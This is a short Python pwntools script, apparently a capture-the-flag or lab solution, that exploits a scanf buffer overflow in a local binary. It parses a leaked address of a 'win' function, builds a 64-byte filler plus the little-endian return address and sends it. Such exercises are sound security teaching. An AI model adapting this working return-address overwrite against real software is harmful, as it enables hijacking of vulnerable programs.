import pwn

if __name__ == "__main__":
    target = pwn.process("./a.out")

    # The big idea is we have an exploitable buffer overflow vulnerability, as scanf("%s")
    # will happily write past the end of a buffer. The address of the win function changes
    # on every connection, so we have to parse it inside the script instead of hardcoding it.
    # Then, we fill the buffer and append the address onto the end. Note that since we're
    # working with an x86_64 Linux system, the address must be 64-bit little-endian.
    win = int(target.recvline().split()[-1], 16)
    payload = b"A" * 64 + pwn.pack(win, 64, "little")

    target.sendline(payload)
    target.interactive()
